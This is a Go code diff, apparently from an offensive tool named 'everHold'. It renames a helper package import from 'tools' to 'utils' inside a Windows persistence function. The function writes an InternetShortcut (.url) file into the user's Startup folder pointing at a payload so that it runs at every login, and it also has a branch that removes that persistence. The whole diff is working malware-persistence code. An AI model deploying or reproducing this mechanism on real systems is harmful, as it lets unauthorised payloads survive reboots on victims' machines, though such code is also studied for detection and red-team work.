@@ -2,7 +2,7 @@ package persist
 
 import (
 	"everHold/src/conf"
-	"everHold/src/tools"
+	"everHold/src/utils"
 	"fmt"
 	"os"
 	"os/user"
@@ -32,13 +32,13 @@ func getPayloadPath(payload string) (string, bool) {
 func persistInkStartup(payload string, name string, add bool) bool {
 	appdata, err := getAppDataPath()
 	if err != nil {
-		tools.PrintError("Failed to get AppData path: " + err.Error())
+		utils.PrintError("Failed to get AppData path: " + err.Error())
 		return false
 	}
 
 	startupDir := filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
-		tools.PrintError("Startup directory not found: " + startupDir)
+		utils.PrintError("Startup directory not found: " + startupDir)
 		return false
 	}
 
@@ -48,30 +48,30 @@ func persistInkStartup(payload string, name string, add bool) bool {
 		if valid {
 			file, err := os.Create(startupFilePath)
 			if err != nil {
-				tools.PrintError("Failed to create startup file: " + err.Error())
+				utils.PrintError("Failed to create startup file: " + err.Error())
 				return false
 			}
 			defer file.Close()
 			_, err = file.WriteString(fmt.Sprintf("\n[InternetShortcut]\nURL=file:///%s\n", payloadPath))
 			if err != nil {
-				tools.PrintError("Failed to write to startup file: " + err.Error())
+				utils.PrintError("Failed to write to startup file: " + err.Error())
 				return false
 			}
-			tools.PrintSuccess("Startup file created: " + startupFilePath)
-			tools.PrintSuccess("payload will run when restart ")
+			utils.PrintSuccess("Startup file created: " + startupFilePath)
+			utils.PrintSuccess("payload will run when restart ")
 			return true
 		} else {
-			tools.PrintError("Cannot proceed, invalid payload")
+			utils.PrintError("Cannot proceed, invalid payload")
 			return false
 		}
 	} else {
-		tools.PrintInfo("Removing startup file (" + startupFilePath + ")")
+		utils.PrintInfo("Removing startup file (" + startupFilePath + ")")
 		err := os.Remove(startupFilePath)
 		if err != nil {
-			tools.PrintError("Unable to remove persistence: " + err.Error())
+			utils.PrintError("Unable to remove persistence: " + err.Error())
 			return false
 		}
-		tools.PrintSuccess("Successfully removed persistence")
+		utils.PrintSuccess("Successfully removed persistence")
 		return true
 	}
 }
